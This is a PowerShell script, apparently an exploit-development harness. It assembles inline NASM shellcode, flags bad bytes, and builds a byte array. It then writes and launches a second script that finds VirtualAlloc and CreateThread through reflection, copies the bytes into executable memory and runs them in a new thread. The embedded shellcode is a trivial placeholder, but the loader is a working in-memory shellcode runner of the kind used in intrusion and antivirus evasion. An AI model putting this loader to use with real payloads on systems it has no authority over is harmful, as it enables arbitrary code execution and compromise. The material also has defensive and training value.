# Architecture
$architecture = 64
#$architecture = 32

# List of bad Bytes
# $badBytes = @('00', 'B8')
$badBytes = @('00')

# Your inline shellcode
$shellcode = @"
BITS $architecture

xor rax, rax
"@



# File paths
$asmPath = "$env:TEMP\shellcode.asm"
$lstPath = "$env:TEMP\shellcode.lst"
$nasmPath = "C:\Program Files\NASM\nasm.exe"

# Write shellcode to file
Set-Content -Path $asmPath -Value $shellcode

# Assemble with NASM
& "$nasmPath" -f bin -l $lstPath $asmPath

# Parse lines
$parsed = @()
foreach ($line in Get-Content $lstPath) {
    if ($line -match '^\s*\d+\s+([0-9A-F]+)\s+([0-9A-Fa-f]+)\s+(.*)') {
        $addr = $matches[1]
        $hexRaw = $matches[2].ToUpper()
        $instr = $matches[3]

        $hexPairs = $hexRaw -split '(?<=\G.{2})'
        $hexSpaced = ($hexPairs -join ' ')
        $foundBad = $hexPairs | Where-Object { $badBytes -contains $_ } | Sort-Object -Unique

        $parsed += [PSCustomObject]@{
            Address     = $addr
            HexSpaced   = $hexSpaced
            Instr       = $instr
            BadBytes    = $foundBad
        }
    }
}

# Determine max length for alignment
$maxLeft = ($parsed | ForEach-Object {
    ("{0}  {1,-20}  {2}" -f $_.Address, $_.HexSpaced, $_.Instr).Length
} | Measure-Object -Maximum).Maximum

# Output lines
foreach ($entry in $parsed) {
    $left = "{0}  {1,-20}  {2}" -f $entry.Address, $entry.HexSpaced, $entry.Instr
    $pad = ' ' * ($maxLeft - $left.Length)

    if ($entry.BadBytes.Count -gt 0) {
        $whichBad = ($entry.BadBytes -join ' ')
        $marker = "<-- BAD BYTE: $whichBad"
        Write-Host "$left$pad  $marker" -ForegroundColor Red
    } else {
        Write-Host "$left$pad"
    }
}


# Dynamically build the shellcode byte array from the parsed listing

# Initialize an empty array to hold each shellcode byte (in hex format)
$shellcodeBytesArray = @()
foreach ($entry in $parsed) {
    # Split the HexSpaced field into individual hex byte tokens
    $bytes = $entry.HexSpaced -split '\s+'
    foreach ($byte in $bytes) {
        # Make sure the byte is not empty
        if (![string]::IsNullOrWhiteSpace($byte)) {
            # Prepend "0x" to each byte so it can be interpreted as a hexadecimal number.
            $shellcodeBytesArray += "0x$byte"
        }
    }
}


# Prepare the final PowerShell execution script dynamically.
$joinedShellcode = $shellcodeBytesArray -join ', '


# Generate a PowerShell script string
$execScript = @"
Write-Host "Current Process ID: `$PID"
Write-Host "Press any key to exit..."
[void][System.Console]::ReadKey(`$true)


[Byte[]] `$shellcode = @($joinedShellcode)


function LookupFunc {
    Param (`$moduleName, `$functionName)
    `$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { `$_.GlobalAssemblyCache -And `$_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    `$tmp = `$assem.GetMethods() | ForEach-Object { if (`$_.Name -eq "GetProcAddress") { `$_ } }
    `$handle = `$assem.GetMethod('GetModuleHandle').Invoke(`$null, @(`$moduleName))
    [IntPtr] `$result = 0
    try {
        Write-Host "First Invoke - `$moduleName `$functionName"
        `$result = `$tmp[0].Invoke(`$null, @(`$handle, `$functionName))
    } catch {
        Write-Host "Second Invoke - `$moduleName `$functionName"
        `$handle = New-Object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @(`$null, `$handle)
        `$result = `$tmp[0].Invoke(`$null, @(`$handle, `$functionName))
    }
    return `$result
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = `$True)] [Type[]] `$func,
        [Parameter(Position = 1)] [Type] `$delType = [Void]
    )
    `$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', `$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    `$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, `$func).SetImplementationFlags('Runtime, Managed')
    `$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', `$delType, `$func).SetImplementationFlags('Runtime, Managed')
    return `$type.CreateType()
}

`$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, `$shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(`$shellcode, 0, `$lpMem, `$shellcode.Length)
`$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero, 0, `$lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke(`$hThread, 0xFFFFFFFF)

"@

$execPath = "$env:TEMP\run_payload.ps1"
Set-Content -Path $execPath -Value $execScript



# Define the typical locations on a 64-bit Windows system:
$PS64 = "$env:windir\system32\WindowsPowerShell\v1.0\powershell.exe"    # 64-bit version
$PS32 = "$env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"      # 32-bit version

# Select the target executable based on the $architecture variable.
# Note: This script chooses the opposite architecture.
if ($architecture -eq 64) {
    # $architecture = 32 means launch the 64-bit (system32) version
    $targetExe = $PS64
    Write-Host "Launching Shellcode in 64-Bit Process."
} elseif ($architecture -eq 32) {
    # $architecture = 64 means launch the 32-bit (SysWOW64) version
    $targetExe = $PS32
    Write-Host "Launching Shellcode in 32-Bit Process.."
} else {
    Write-Error "Invalid architecture specified. Please use 32 or 64."
    exit
}

# Start in new PowerShell process
Start-Process powershell -ArgumentList "-NoExit -File `"$execPath`""
